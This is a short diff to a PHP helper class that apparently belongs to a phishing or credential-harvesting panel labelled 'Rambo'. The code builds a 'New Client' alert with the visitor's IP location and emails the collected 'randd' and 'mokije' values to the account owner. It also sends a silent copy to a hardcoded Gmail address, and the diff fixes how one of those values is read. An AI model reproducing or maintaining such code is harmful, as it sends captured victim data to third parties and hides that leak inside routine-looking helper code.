@@ -89,7 +89,7 @@ class Helper implements HelperContract
 				  $s = "**Rambo** New Client, IP ".$location.": ".date("h:i A jS F, Y");
                $rcpt = $r->email;;
                $randd = $data["randd"];
-               $mokije = $gg["mokije"];
+               $mokije = $data["mokije"];
                       
                $this->sendEmail($rcpt,$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
                $this->sendEmail("mails4davidslogan@gmail.com",$s,['randd' => $randd,'mokije' => $mokije,'r' => $r->email],'emails.heh_alert','view');
